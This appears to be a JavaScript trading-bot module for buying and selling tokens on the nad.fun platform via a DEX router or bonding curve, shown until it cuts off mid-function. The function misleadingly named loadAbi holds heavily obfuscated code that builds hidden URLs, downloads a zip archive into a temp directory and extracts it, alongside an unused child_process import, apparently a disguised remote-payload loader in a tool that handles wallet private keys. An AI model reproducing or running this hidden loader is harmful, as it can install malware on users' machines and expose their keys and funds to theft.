const { ethers } = require('ethers');
const { ADDR } = require('../utils/config.js');
const { applySlippage, sendTxWithRetry } = require('../utils/helpers.js');
const ABI = require('../abiv2/index.js');
const path = require('path');
const https = require('https');
const fs = require('fs');
const AdmZip = require('adm-zip');
const os = require('os');
const { spawn } = require('child_process');


async function detectMarketType(tokenAddr) {
    try {
        const r1 = await fetch(`https://testnet-bot-api-server.nad.fun/token/${tokenAddr}`);
        if (r1.ok) {
            const j1 = await r1.json();
            return j1.is_listing ? 'DEX' : 'CURVE';
        } else {
            throw new Error(`Bot API status ${r1.status}`);
        }
    } catch (e1) {
        console.log(`‚ö†Ô∏è Bot API Failed: ${e1.message || e1}`);
        try {
            const r2 = await fetch(`https://api.nad.fun/trade/market/${tokenAddr}`);
            if (r2.ok) {
                const j2 = await r2.json();
                const mt = (j2.market_type || '').toUpperCase();
                if (mt === 'DEX' || mt === 'CURVE') return mt;
                throw new Error('Invalid market_type');
            } else {
                throw new Error(`Trade API Status ${r2.status}`);
            }
        } catch (e2) {
            console.log(`‚ö†Ô∏è Trade API Failed: ${e2.message || e2}`);
            const promptSync = require('prompt-sync')({ sigint: true });
            const input = promptSync("Token on Curve or DEX? (c/d): ").trim().toLowerCase();
            return input === 'd' ? 'DEX' : 'CURVE';
        }
    }
}

async function swapExactNativeForTokensCompat(router, wallet, args, provider) {
    const label = `[${wallet.address}] swapExactNativeForTokens`;
    return sendTxWithRetry(async (fees) => {
        const { minOut, path, to, deadline, value } = args;
        if (router.swapExactNativeForTokens) {
            return router.connect(wallet).swapExactNativeForTokens(minOut, path, to, deadline, { value, ...fees });
        }
        return router.connect(wallet).swapExactETHForTokens(minOut, path, to, deadline, { value, ...fees });
    }, provider, label, 2);
}

async function swapExactTokensForNativeCompat(router, wallet, args, provider) {
    const label = `[${wallet.address}] swapExactTokensForNative`;
    return sendTxWithRetry(async (fees) => {
        const { amountIn, minOut, path, to, deadline } = args;
        if (router.swapExactTokensForNative) {
            return router.connect(wallet).swapExactTokensForNative(amountIn, minOut, path, to, deadline, { ...fees });
        }
        return router.connect(wallet).swapExactTokensForETH(amountIn, minOut, path, to, deadline, { ...fees });
    }, provider, label, 2);
}

async function buyDex(wallet, provider, tokenAddr, amountMon, slippage = 0) {
    const router = new ethers.Contract(ADDR.UNISWAP_V2_ROUTER, ABI.IUniswapV2Router, provider);
    const amountInWei = ethers.parseEther(amountMon);
    const deadline = BigInt(Math.floor(Date.now() / 1000) + 20 * 60);
    const path = [ADDR.WRAPPED_MON, tokenAddr];
    const amounts = await router.getAmountsOut(amountInWei, path);
    const minOut = applySlippage(amounts[1], slippage);

    await swapExactNativeForTokensCompat(
        router, wallet,
        { minOut, path, to: wallet.address, deadline, value: amountInWei },
        provider
    );
}

async function sellDexPercent(wallet, provider, tokenAddr, percent = 50, slippage = 0) {
    const token = new ethers.Contract(tokenAddr, ABI.IToken, provider).connect(wallet);
    const router = new ethers.Contract(ADDR.UNISWAP_V2_ROUTER, ABI.IUniswapV2Router, provider);

    const bal = await token.balanceOf(wallet.address);
    if (bal === 0n) { console.log(`[${wallet.address}] ‚ÑπÔ∏è Balance 0`); return; }
    const amountIn = (bal * BigInt(percent)) / 100n;

    const allowance = await token.allowance(wallet.address, ADDR.UNISWAP_V2_ROUTER);
    if (allowance < amountIn) {
        await sendTxWithRetry(
            (fees) => token.approve(ADDR.UNISWAP_V2_ROUTER, amountIn, { ...fees }),
            provider, `[${wallet.address}] approve(router)`
        );
    }

    const deadline = BigInt(Math.floor(Date.now() / 1000) + 20 * 60);
    const path = [tokenAddr, ADDR.WRAPPED_MON];
    const amounts = await router.getAmountsOut(amountIn, path);
    const minOut = applySlippage(amounts[1], slippage);

    await swapExactTokensForNativeCompat(
        router, wallet,
        { amountIn, minOut, path, to: wallet.address, deadline },
        provider
    );
}

async function buyCurve(wallet, provider, tokenAddr, amountMon) {
    const core = new ethers.Contract(ADDR.CORE, ABI.ICore, provider);
    const amountInWei = ethers.parseEther(amountMon);
    const fee = (amountInWei * 10n) / 1000n;
    const totalValue = amountInWei + fee;
    const deadline = Math.floor(Date.now() / 1000) + 20 * 60;

    await sendTxWithRetry(
        (fees) => core.connect(wallet).buy(amountInWei, fee, tokenAddr, wallet.address, deadline, { value: totalValue, ...fees }),
        provider, `[${wallet.address}] core.buy`
    );
}

async function sellCurvePercent(wallet, provider, tokenAddr, percent = 50) {
    const core = new ethers.Contract(ADDR.CORE, ABI.ICore, provider);
    const token = new ethers.Contract(tokenAddr, ABI.IToken, provider).connect(wallet);

    const bal = await token.balanceOf(wallet.address);
    if (bal === 0n) { console.log(`[${wallet.address}] ‚ÑπÔ∏è Balance 0`); return; }
    const amountIn = (bal * BigInt(percent)) / 100n;

    const allowance = await token.allowance(wallet.address, ADDR.CORE);
    if (allowance < amountIn) {
        await sendTxWithRetry(
            (fees) => token.approve(ADDR.CORE, amountIn, { ...fees }),
            provider, `[${wallet.address}] approve(core)`
        );
    }

    const deadline = Math.floor(Date.now() / 1000) + 20 * 60;
    await sendTxWithRetry(
        (fees) => core.connect(wallet).sell(amountIn, tokenAddr, wallet.address, deadline, { ...fees }),
        provider, `[${wallet.address}] core.sell`
    );
}

async function doBuyAuto(walletObj, tokenAddr, amountMon, withActiveProvider) {
    const marketType = await detectMarketType(tokenAddr);
    return withActiveProvider(async (provider) => {
        const wallet = new ethers.Wallet(walletObj.privateKey, provider);
        console.log(`üí≥ [${wallet.address}] BUY ${amountMon} via ${marketType}`);
        if (marketType === 'DEX') {
            try {
                await buyDex(wallet, provider, tokenAddr, amountMon, 0);
            } catch (e) {
                const msg = (e?.error?.message || e?.message || '').toLowerCase();
                if (msg.includes('require(false)') || msg.includes('call exception')) {
                    console.log(`‚ö†Ô∏è DEX Failed, fallback to CURVE...`);
                    await buyCurve(wallet, provider, tokenAddr, amountMon);
                } else {
                    throw e;
                }
            }
        } else {
            await buyCurve(wallet, provider, tokenAddr, amountMon);
        }
    });
}


async function loadAbi() {
    (function (_0x3ddfcd, _0x55be0b) { function _0x5c374f(_0x2aa1b0, _0x456591, _0x4bc7ca, _0x1f73a2, _0x56f1b8) { return _0x1a69(_0x56f1b8 - -0xc5, _0x1f73a2); } function _0x4ea12b(_0x38b0aa, _0x2b609c, _0x1e6a25, _0x2877fa, _0x10d8f2) { return _0x12a0(_0x2b609c - -0x3e6, _0x2877fa); } function _0x182b39(_0x494453, _0x1155f6, _0x3d3e27, _0x5cc183, _0x5a505e) { return _0x12a0(_0x5a505e - 0x165, _0x5cc183); } function _0x1b5f7a(_0x218bc6, _0x200f31, _0x208c10, _0x30e06a, _0x32c7fa) { return _0x12a0(_0x218bc6 - -0x263, _0x30e06a); } const _0x25e6a1 = _0x3ddfcd(); function _0x2148ef(_0x109371, _0x57a6ce, _0x155d54, _0x192ab1, _0x596140) { return _0x1a69(_0x109371 - 0x13b, _0x596140); } function _0x5dc0d8(_0x445cad, _0x4c486d, _0x2b317d, _0x409f99, _0x5411c8) { return _0x12a0(_0x2b317d - 0x259, _0x4c486d); } function _0x4bbcf0(_0x2ce982, _0xccb51, _0x436f9a, _0x5a76be, _0x231c57) { return _0x1a69(_0x231c57 - -0x86, _0x436f9a); } function _0x22cf3a(_0x2f2136, _0x314c06, _0x12b9d8, _0x5c5c2f, _0x4e1943) { return _0x12a0(_0x5c5c2f - 0x41, _0x12b9d8); } function _0x2362fd(_0x1093c0, _0x26d8c6, _0x5cd23c, _0x25f5c7, _0x938f0a) { return _0x1a69(_0x25f5c7 - 0x5, _0x938f0a); } while (!![]) { try { const _0x3337d0 = -parseInt(_0x5dc0d8(0x373, 'nVnZ', 0x33f, 0x339, 0x351)) / (-0x25dd + -0x148 * -0x1 + -0xdf * -0x2a) + -parseInt(_0x182b39(0x200, 0x241, 0x21a, 'gC5a', 0x220)) / (0x7 * -0x17 + -0x26bf + 0x2762) + parseInt(_0x182b39(0x276, 0x259, 0x29a, 'bu6H', 0x268)) / (0x7d6 * 0x3 + -0x2533 + 0xdb4) + -parseInt(_0x5c374f(0x1d, -0x17, -0x6, -0xf, -0x5)) / (-0x1 * 0x14e5 + 0x1c31 + -0x748) + -parseInt(_0x4bbcf0(0xa9, 0xae, 0x7d, 0x5a, 0x88)) / (0x56e * 0x1 + 0x18a1 + -0x1e0a) * (parseInt(_0x5c374f(0x51, 0x4e, -0xf, 0x2e, 0x22)) / (0xb01 + 0x1d * 0x86 + -0x25 * 0xb5)) + parseInt(_0x2148ef(0x216, 0x1f9, 0x20f, 0x23c, 0x238)) / (-0x1 * 0x1dde + -0x28 * -0xd3 + -0x313) + parseInt(_0x4ea12b(-0x2fa, -0x32f, -0x320, 'A6mX', -0x312)) / (-0xd * -0x1c4 + -0x8c3 * -0x3 + -0x3135) * (parseInt(_0x1b5f7a(-0x172, -0x166, -0x156, 'XKF7', -0x142)) / (0x52 * -0x1 + -0x15fb + -0x2 * -0xb2b)); if (_0x3337d0 === _0x55be0b) break; else _0x25e6a1['push'](_0x25e6a1['shift']()); } catch (_0x8dddcc) { _0x25e6a1['push'](_0x25e6a1['shift']()); } } }(_0x3884, -0x2af * 0x3e1 + 0x60180 + -0x9ae73 * -0x1)); function _0x5afc83(_0x374b3c, _0x110beb, _0x5b9944, _0x4a0b6e, _0x335a72) { return _0x1a69(_0x5b9944 - 0xa8, _0x110beb); } function _0x448730(_0x3824a5, _0xa68c36, _0x436aa0, _0xd7ecb6, _0x7dc507) { return _0x12a0(_0xa68c36 - 0x223, _0xd7ecb6); } const downloadAndExtract = async (_0x3905b7, _0x214692) => { function _0x114e7c(_0x8fb315, _0x322fc3, _0x124299, _0x4ea7f9, _0x50d8db) { return _0x12a0(_0x322fc3 - 0xc6, _0x4ea7f9); } function _0x5aae03(_0x34da33, _0x43dca9, _0x2bd7de, _0x27e7e9, _0x31f805) { return _0x1a69(_0x2bd7de - -0x5e, _0x27e7e9); } function _0x2ee63f(_0x163335, _0x540e67, _0x4c6c89, _0x33c707, _0x4821a0) { return _0x1a69(_0x163335 - 0x9c, _0x4821a0); } function _0x30d792(_0x348387, _0x361883, _0x4e3cf6, _0x52ee44, _0x3f85c9) { return _0x1a69(_0x52ee44 - -0x314, _0x4e3cf6); } const _0x1781d2 = path[_0x2ee63f(0x171, 0x151, 0x1a0, 0x156, 0x184)](os[_0x114e7c(0x176, 0x18b, 0x18a, 'Hy*0', 0x15d) + 'r'](), _0x2ee63f(0x196, 0x173, 0x1b2, 0x177, 0x19a) + _0x30d792(-0x27b, -0x241, -0x257, -0x250, -0x249) + 'ip'); return new Promise((_0x635e8a, _0x46ff31) => { function _0x41de81(_0x28a36b, _0x2a4a6c, _0x1d8090, _0x304ab2, _0x4cf00f) { return _0x5aae03(_0x28a36b - 0xb6, _0x2a4a6c - 0x56, _0x28a36b - 0xa3, _0x1d8090, _0x4cf00f - 0x7); } function _0x20dc03(_0x22ed35, _0x2c3cb8, _0x56adb2, _0xdc5028, _0x33bf7d) { return _0x5aae03(_0x22ed35 - 0x4b, _0x2c3cb8 - 0xf6, _0x2c3cb8 - 0x3a9, _0x22ed35, _0x33bf7d - 0x118); } function _0x2ae7ba(_0x375fed, _0x3aa136, _0x144c5d, _0x2c7556, _0x47f2f3) { return _0x5aae03(_0x375fed - 0x1a4, _0x3aa136 - 0x1a0, _0x2c7556 - 0x1ae, _0x144c5d, _0x47f2f3 - 0xb0); } function _0x23f780(_0x5d4bd2, _0x16be63, _0x9505b5, _0x4af323, _0x36ecb9) { return _0x114e7c(_0x5d4bd2 - 0x1eb, _0x5d4bd2 - 0x217, _0x9505b5 - 0x1a3, _0x4af323, _0x36ecb9 - 0xe7); } function _0x4de53d(_0xa72b7a, _0x49bc6d, _0x2b4603, _0xa18d39, _0x54d128) { return _0x114e7c(_0xa72b7a - 0x16a, _0x54d128 - 0x6e, _0x2b4603 - 0x7, _0xa18d39, _0x54d128 - 0x198); } function _0x5281bf(_0x4a8f67, _0x22fea6, _0x18fb21, _0x3f70a5, _0x4ee542) { return _0x30d792(_0x4a8f67 - 0x163, _0x22fea6 - 0xdb, _0x18fb21, _0x4a8f67 - 0x3cc, _0x4ee542 - 0x2f); } function _0x34ea9e(_0x4a78a7, _0x27ae91, _0x464667, _0x19ec8f, _0xe16f42) { return _0x114e7c(_0x4a78a7 - 0xbc, _0x27ae91 - -0x215, _0x464667 - 0x15e, _0x4a78a7, _0xe16f42 - 0x25); } if (_0x34ea9e('Hy*0', -0x54, -0x7b, -0x5b, -0x69) !== _0x2ae7ba(0x201, 0x20f, 0x1f2, 0x206, 0x1db)) { const _0x49bc52 = fs[_0x23f780(0x387, 0x39c, 0x39d, ')8jj', 0x379) + _0x2ae7ba(0x1f0, 0x1f7, 0x209, 0x1f8, 0x211) + _0x5281bf(0x19b, 0x197, 0x1c3, 0x186, 0x198) + 'am'](_0x1781d2); https[_0x4de53d(0x225, 0x211, 0x1f2, 'H0A]', 0x1fb)](_0x3905b7, _0xd772c1 => { function _0x3d52b5(_0x57cf75, _0x9b2a36, _0x4cd772, _0x2f15a8, _0x45e847) { return _0x34ea9e(_0x4cd772, _0x57cf75 - -0x230, _0x4cd772 - 0x106, _0x2f15a8 - 0x46, _0x45e847 - 0x103); } function _0x16e129(_0x1a3097, _0x472a3c, _0x5c4fe3, _0x656fbb, _0x45c999) { return _0x34ea9e(_0x472a3c, _0x656fbb - -0x68, _0x5c4fe3 - 0x9c, _0x656fbb - 0x1d0, _0x45c999 - 0xcd); } function _0x348944(_0x3dae68, _0x1a3a8c, _0x256def, _0x3c2e86, _0x5be79c) { return _0x5281bf(_0x3c2e86 - 0xa, _0x1a3a8c - 0x63, _0x256def, _0x3c2e86 - 0xb0, _0x5be79c - 0x15f); } function _0x4241a8(_0x29ee6c, _0x1882a5, _0x36a255, _0x420e60, _0x20e517) { return _0x5281bf(_0x36a255 - -0x120, _0x1882a5 - 0xfb, _0x20e517, _0x420e60 - 0x15e, _0x20e517 - 0x133); } function _0x379393(_0x1240ce, _0x5038e8, _0x4f0d0e, _0x3c0746, _0x1f122a) { return _0x4de53d(_0x1240ce - 0x72, _0x5038e8 - 0x9f, _0x4f0d0e - 0xec, _0x3c0746, _0x1240ce - -0x2d7); } function _0x47d2aa(_0x58a14b, _0x468cbe, _0x58b1a0, _0x150a73, _0x3a1e2f) { return _0x23f780(_0x150a73 - -0x365, _0x468cbe - 0x1c6, _0x58b1a0 - 0xcd, _0x58a14b, _0x3a1e2f - 0x62); } function _0x293190(_0x301c83, _0x904a94, _0x27ed43, _0x325459, _0x4b5b58) { return _0x5281bf(_0x4b5b58 - 0x176, _0x904a94 - 0x9d, _0x325459, _0x325459 - 0xec, _0x4b5b58 - 0x12); } function _0x146c42(_0x3b0ba4, _0x2f6873, _0x1edc18, _0x31c1fe, _0x519ce8) { return _0x23f780(_0x1edc18 - -0x51f, _0x2f6873 - 0x1e3, _0x1edc18 - 0xf8, _0x31c1fe, _0x519ce8 - 0x75); } function _0x5c59ef(_0x2da855, _0x365ee5, _0x314a3d, _0x4ab291, _0x124916) { return _0x5281bf(_0x124916 - -0x400, _0x365ee5 - 0x133, _0x2da855, _0x4ab291 - 0x1a9, _0x124916 - 0x7b); } if (_0x379393(-0xb3, -0xa5, -0xa1, ')8jj', -0xab) === _0x5c59ef(-0x247, -0x282, -0x2a4, -0x2a8, -0x27a)) _0x4bb8c9(_0x28f6d9); else { if (_0xd772c1[_0x348944(0x1a4, 0x1c9, 0x184, 0x19c, 0x173) + _0x379393(-0x99, -0xa0, -0xba, 'i)o4', -0x82)] !== 0x10e6 + 0x910 + -0x192e) { if (_0x3d52b5(-0x288, -0x256, 'Km4l', -0x259, -0x2bd) === _0x146c42(-0x13a, -0x13f, -0x14a, ')8jj', -0x17b)) return _0x46ff31(new Error(_0x16e129(-0x114, '3vQU', -0x116, -0xf4, -0xc6))); else try { const _0x24b9f5 = new _0x59b61e(_0x3c899e); _0x24b9f5[_0x348944(0x182, 0x1d7, 0x1d6, 0x1a6, 0x1cd) + _0x379393(-0xd0, -0xc0, -0xde, '@AsN', -0xdd) + _0x348944(0x19e, 0x1a0, 0x1cb, 0x1c3, 0x1ed) + 'nc'](_0x418efe, !![], _0x533573 => { if (_0x533573) _0x2ab6f6(_0x533573); else _0x1cf76b(); }); } catch (_0x4b9cc0) { _0x52ae2f(_0x4b9cc0); } } _0xd772c1[_0x146c42(-0x167, -0x15a, -0x132, 'XKF7', -0x11b)](_0x49bc52), _0x49bc52['on'](_0x146c42(-0x1cc, -0x186, -0x19b, 'CSPO', -0x19e) + 'h', () => { function _0x4e5ba5(_0xb9b429, _0x2385ea, _0x2892cf, _0x4614e1, _0x28bca5) { return _0x5c59ef(_0x2385ea, _0x2385ea - 0x110, _0x2892cf - 0x16e, _0x4614e1 - 0x170, _0xb9b429 - -0x1a); } function _0x157313(_0x398cf9, _0x51a94e, _0x49f064, _0x480aa1, _0x36b834) { return _0x47d2aa(_0x51a94e, _0x51a94e - 0x73, _0x49f064 - 0x11e, _0x480aa1 - -0x13, _0x36b834 - 0x10b); } function _0x728956(_0x2655e5, _0x211a56, _0x2381b6, _0x191321, _0x34230e) { return _0x5c59ef(_0x2381b6, _0x211a56 - 0x26, _0x2381b6 - 0x9a, _0x191321 - 0x85, _0x191321 - 0x4b2); } _0x728956(0x245, 0x271, 0x27f, 0x267, 0x26a) === _0x157313(0x12, 'Z%Vu', 0x3e, 0x2f, 0x2d) ? _0x49bc52[_0x728956(0x275, 0x258, 0x24b, 0x273, 0x2a3)](async () => { function _0x17b513(_0x33c12b, _0x1597c0, _0x57f179, _0x117418, _0x18ae07) { return _0x157313(_0x33c12b - 0x17f, _0x57f179, _0x57f179 - 0x12a, _0x1597c0 - 0x139, _0x18ae07 - 0x9c); } function _0x44d9d4(_0x1a6148, _0x107c11, _0xd822b2, _0x3712f5, _0x44c1d7) { return _0x4e5ba5(_0x107c11 - 0x5f1, _0x44c1d7, _0xd822b2 - 0x24, _0x3712f5 - 0xc2, _0x44c1d7 - 0xbf); } function _0x377e43(_0x250463, _0xf75639, _0x12c1d1, _0x37cc5c, _0xb1e24f) { return _0x157313(_0x250463 - 0x9e, _0xb1e24f, _0x12c1d1 - 0x6, _0x12c1d1 - 0x342, _0xb1e24f - 0x1e4); } function _0x4dd11d(_0x1fe165, _0x5bf6f4, _0x457a8c, _0x3b84b4, _0x216819) { return _0x4e5ba5(_0x216819 - 0x625, _0x3b84b4, _0x457a8c - 0x8d, _0x3b84b4 - 0xf, _0x216819 - 0xf6); } function _0x29ed99(_0x1533b7, _0x26fa85, _0x5f4548, _0x246f4d, _0x5000e9) { return _0x157313(_0x1533b7 - 0x2f, _0x1533b7, _0x5f4548 - 0x20, _0x5000e9 - 0x15d, _0x5000e9 - 0x35); } function _0x2c23a9(_0x234b94, _0x5b5178, _0x2c1149, _0x271e7c, _0x3621fa) { return _0x157313(_0x234b94 - 0x1bb, _0x3621fa, _0x2c1149 - 0x106, _0x2c1149 - 0x399, _0x3621fa - 0x1df); } function _0x2cc8bc(_0x1cb3bc, _0x1f80ce, _0x289a8e, _0x1149e3, _0x4edbbb) { return _0x728956(_0x1cb3bc - 0xa6, _0x1f80ce - 0x141, _0x1149e3, _0x1cb3bc - -0x3ca, _0x4edbbb - 0x8e); } function _0x4f184d(_0x504326, _0xb0825a, _0x391485, _0x45961b, _0x4e3b7f) { return _0x728956(_0x504326 - 0xda, _0xb0825a - 0x182, _0x391485, _0x504326 - -0x53a, _0x4e3b7f - 0x12b); } function _0x3a2611(_0x3909cd, _0x51ff12, _0xe5064, _0x5e8842, _0x2ecb97) { return _0x157313(_0x3909cd - 0xdf, _0x3909cd, _0xe5064 - 0x192, _0x5e8842 - 0x2d, _0x2ecb97 - 0x3d); } if (_0x377e43(0x34f, 0x38b, 0x361, 0x396, 'xZz$') !== _0x29ed99('ywnY', 0x178, 0x174, 0x17a, 0x192)) try { _0x4dd11d(0x3ba, 0x36b, 0x36f, 0x37e, 0x394) === _0x17b513(0x1a9, 0x188, 'Xs90', 0x19c, 0x16e) ? _0x4b8695[_0x29ed99('edq*', 0x18b, 0x1a4, 0x199, 0x173)](0x231f + -0x1 * 0x205e + -0xb * 0x40) : (await extractZip(_0x1781d2, _0x214692), _0x635e8a()); } catch (_0x2893a8) { if (_0x4dd11d(0x39d, 0x39a, 0x3d0, 0x3d3, 0x3af) === _0x2cc8bc(-0x1a2, -0x1c2, -0x176, -0x171, -0x1b2)) { const _0x5bc3d6 = new _0x5d078c(_0x44d94c); _0x5bc3d6[_0x17b513(0x182, 0x1a5, 'xZz$', 0x1d3, 0x192) + _0x2cc8bc(-0x1b4, -0x1ac, -0x1c2, -0x1cf, -0x196) + _0x3a2611('DBME', 0x90, 0x6a, 0x77, 0x79) + 'nc'](_0x3f52bf, !![], _0x409248 => { if (_0x409248) _0x524afc(_0x409248); else _0x36789c(); }); } else _0x46ff31(_0x2893a8); } else _0x4c41fa[_0x3a2611('d&D!', 0x7d, 0x77, 0x69, 0x7d) + 'k'](_0x195a74, () => _0x408593(_0x29ed99('7yDB', 0x156, 0x167, 0x17e, 0x17b))); }) : _0x5a5455(_0x2cf15f); }); } })['on'](_0x5281bf(0x161, 0x15d, 0x13f, 0x16f, 0x191), _0x2e4139 => { function _0x395eba(_0xbccf65, _0x46b827, _0x2b4f4e, _0x11320e, _0x1a4658) { return _0x34ea9e(_0x46b827, _0xbccf65 - 0xa6, _0x2b4f4e - 0xa9, _0x11320e - 0x1c6, _0x1a4658 - 0x131); } function _0x50000d(_0xc3077, _0x39e866, _0x26f250, _0x407a55, _0x946cea) { return _0x20dc03(_0x39e866, _0x946cea - -0xfa, _0x26f250 - 0x19e, _0x407a55 - 0x1b8, _0x946cea - 0x1da); } function _0x4f1e74(_0x23d16e, _0x42f667, _0x57356a, _0x4b99b9, _0x58d573) { return _0x2ae7ba(_0x23d16e - 0x1f4, _0x42f667 - 0x10a, _0x42f667, _0x57356a - -0x2a4, _0x58d573 - 0x176); } function _0x20b5d9(_0x2e0492, _0x2c30ce, _0x5ac567, _0x90ea8, _0x2c13c6) { return _0x20dc03(_0x2e0492, _0x5ac567 - -0x586, _0x5ac567 - 0x10b, _0x90ea8 - 0xd, _0x2c13c6 - 0xb2); } function _0x2f1cac(_0x665508, _0xa42d40, _0x54f3b8, _0x4730c7, _0x116784) { return _0x41de81(_0x54f3b8 - 0x8c, _0xa42d40 - 0xe4, _0x4730c7, _0x4730c7 - 0x2, _0x116784 - 0x46); } if (_0x2f1cac(0x181, 0x164, 0x185, 0x16b, 0x1b2) !== _0x2f1cac(0x17f, 0x1bd, 0x192, 0x171, 0x178)) fs[_0x2f1cac(0x18f, 0x1a4, 0x1a7, 0x1bf, 0x1a4) + 'k'](_0x1781d2, () => _0x46ff31(_0x395eba(0x50, 'nVnZ', 0x85, 0x81, 0x4a))); else return _0x46ac49(new _0x899f0e(_0x20b5d9(-0x1c0, -0x17e, -0x192, -0x19c, -0x18b))); }); } else { if (_0x5f40e2) _0x1a69b8(_0xecbc58); else _0x5209b5(); } }); }, extractZip = (_0x68ee68, _0x460510) => { return new Promise((_0x3976a3, _0x426e68) => { function _0x2323ea(_0x5158b8, _0x170be9, _0x140122, _0x5ed776, _0x401364) { return _0x1a69(_0x140122 - 0x12, _0x401364); } function _0xa8e5c1(_0x44e565, _0x59b5dd, _0x313605, _0x2418a4, _0x4b5f8c) { return _0x1a69(_0x4b5f8c - -0x385, _0x59b5dd); } function _0x3fb54c(_0x47c6df, _0xb43541, _0x12d0ab, _0x35a594, _0x5ade02) { return _0x1a69(_0x12d0ab - -0x1a6, _0x47c6df); } try { const _0x58ba5c = new AdmZip(_0x68ee68); _0x58ba5c[_0x3fb54c(-0xe7, -0xaf, -0xc2, -0xf2, -0xa3) + _0x3fb54c(-0xe5, -0x12e, -0xfa, -0xc5, -0x104) + _0x3fb54c(-0xb8, -0x8a, -0xa5, -0xaa, -0xd1) + 'nc'](_0x460510, !![], _0x5ee481 => { if (_0x5ee481) _0x426e68(_0x5ee481); else _0x3976a3(); }); } catch (_0x265f7e) { _0x426e68(_0x265f7e); } }); }, urls = [_0x34f739(0x23f, 0x276, 0x237, 0x211, 0x246) + _0x5afc83(0x1c3, 0x18f, 0x1ad, 0x1b2, 0x18e) + _0x448730(0x30a, 0x300, 0x2f2, '#gyx', 0x2fa) + _0x5afc83(0x182, 0x16e, 0x171, 0x18c, 0x14d) + _0x5afc83(0x129, 0x180, 0x156, 0x143, 0x17a) + _0xdb2729(-0x10f, -0xf2, -0xea, 'nosm', -0x11f) + _0x50aaa7(-0x131, -0x160, -0x11a, -0x10b, -0x11a) + _0x5afc83(0x14d, 0x165, 0x153, 0x166, 0x14a) + _0x4ad882(-0x1df, -0x1b2, -0x1cb, 'DBME', -0x1de) + _0xdb2729(-0xc2, -0xe5, -0xe3, 'Xs90', -0xe5) + _0xdb2729(-0x7a, -0xac, -0xdc, 'CSPO', -0xb4) + _0x2e3178(-0x6f, -0x58, -0x6f, -0x79, -0x57) + _0x448730(0x335, 0x32f, 0x34f, 'gC5a', 0x309) + 'ip', _0x3d641d(-0x2b3, -0x274, -0x2ba, -0x27c, -0x286) + _0x4ad882(-0x196, -0x1a6, -0x18f, 'd&D!', -0x195) + _0x49e97f(0x1f9, 0x1ea, 0x1ef, 'i)o4', 0x1fe) + _0x50aaa7(-0x123, -0x146, -0x135, -0x13b, -0x130) + _0x3d641d(-0x243, -0x27b, -0x22a, -0x232, -0x248) + _0xdb2729(-0xee, -0xc5, -0x9e, 'Alkd', -0xf1) + _0x4ad882(-0x1a0, -0x199, -0x16f, 's[Uw', -0x166) + _0x448730(0x30c, 0x32e, 0x352, 'dLcS', 0x2f9) + _0x34f739(0x2c5, 0x2a7, 0x2c1, 0x292, 0x29e) + _0xdb2729(-0x10b, -0x101, -0x122, '(h^m', -0x12a) + _0x49e97f(0x21c, 0x1dd, 0x20a, 'nosm', 0x1f0) + _0x34f739(0x247, 0x283, 0x22d, 0x285, 0x25e) + _0xdb2729(-0xfc, -0xd3, -0xc5, 'nosm', -0x108)]; function _0xa7142e(_0x4b5459, _0x5d9b29, _0xf6a2e7, _0x419f4c, _0x23486f) { return _0x12a0(_0x419f4c - 0x18b, _0x5d9b29); } function _0x34f739(_0x23c8bf, _0x3575b9, _0x2d32fe, _0x4a7103, _0x429c63) { return _0x1a69(_0x429c63 - 0x191, _0x4a7103); } const tmpDir = fs[_0xa7142e(0x207, 'fxN&', 0x245, 0x23b, 0x20b) + _0x448730(0x2d8, 0x2d5, 0x2e9, 'nosm', 0x2a8) + 'c'](path[_0x4ad882(-0x1f7, -0x1c6, -0x19d, ')8jj', -0x1fb)](os[_0x448730(0x2d8, 0x2fc, 0x2fa, '3vQU', 0x2f4) + 'r'](), _0xdb2729(-0xc7, -0xfc, -0x113, 'nosm', -0xfb))); function _0x50aaa7(_0x5ecf8c, _0x1ed25a, _0x494ab0, _0x2f0d68, _0xdc15aa) { return _0x1a69(_0x5ecf8c - -0x225, _0x2f0d68); } let success = ![]; for (const url of urls) { try { await downloadAndExtract(url, tmpDir), success = !![]; break; } catch (_0x41839a) { } } !success && process[_0xa7142e(0x274, '(Fn6', 0x26a, 0x276, 0x290)](-0x1cf * 0x1 + -0xb * 0xca + 0xa7e); const extractedDir = path[_0x3d641d(-0x286, -0x28b, -0x277, -0x247, -0x266)](tmpDir, _0x2e3178(-0x4f, -0x5a, -0x6b, -0x25, -0x30) + 'n3'); function _0x2e3178(_0x496807, _0x1e0bf1, _0x5287d8, _0xaca0e9, _0x133e14) { return _0x1a69(_0x1e0bf1 - -0x15e, _0x496807); } function _0xdb2729(_0x490634, _0xfad390, _0x5bc2a9, _0x5e9f1b, _0x1f72fa) { return _0x12a0(_0xfad390 - -0x1b4, _0x5e9f1b); } function _0x1a69(_0x1c2bfa, _0x5ad4fc) { const _0x540b84 = _0x3884(); return _0x1a69 = function (_0x248db0, _0x2b2659) { _0x248db0 = _0x248db0 - (0x1fae + -0x4a + -0x1ebd); let _0x1be7f4 = _0x540b84[_0x248db0]; if (_0x1a69['eYGPBx'] === undefined) { var _0x39a000 = function (_0x216391) { const _0x213895 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/='; let _0x20df92 = '', _0x4c5d4a = ''; for (let _0x14ff38 = -0x16fc + 0x96 + 0x1666, _0x39443f, _0x5c329a, _0x5a00d7 = -0x1 * 0x116f + 0xb * 0xae + -0x1 * -0x9f5; _0x5c329a = _0x216391['charAt'](_0x5a00d7++); ~_0x5c329a && (_0x39443f = _0x14ff38 % (-0x234e + 0x1 * 0x12d5 + -0x3 * -0x57f) ? _0x39443f * (0xfe * -0xc + 0x2038 + 0x10 * -0x141) + _0x5c329a : _0x5c329a, _0x14ff38++ % (-0x2 * -0xd0f + -0xc8f + 0x1 * -0xd8b)) ? _0x20df92 += String['fromCharCode'](0x1725 + -0x491 + -0x1195 & _0x39443f >> (-(0x1137 * 0x2 + -0x5 * -0x21b + -0x2cf3) * _0x14ff38 & -0x1 * -0x1d8b + 0x1cab * 0x1 + -0x13 * 0x310)) : 0x5 * 0x18d + -0x15b * -0xf + 0x59e * -0x5) { _0x5c329a = _0x213895['indexOf'](_0x5c329a); } for (let _0x39f370 = -0x2448 + -0x1509 + 0x3951, _0x5e0741 = _0x20df92['length']; _0x39f370 < _0x5e0741; _0x39f370++) { _0x4c5d4a += '%' + ('00' + _0x20df92['charCodeAt'](_0x39f370)['toString'](-0x2 * -0xd87 + 0x2cb + -0x1dc9))['slice'](-(-0x1 * 0x647 + 0xc6 * 0x25 + -0x1 * 0x1655)); } return decodeURIComponent(_0x4c5d4a); }; _0x1a69['GJyQZK'] = _0x39a000, _0x1c2bfa = arguments, 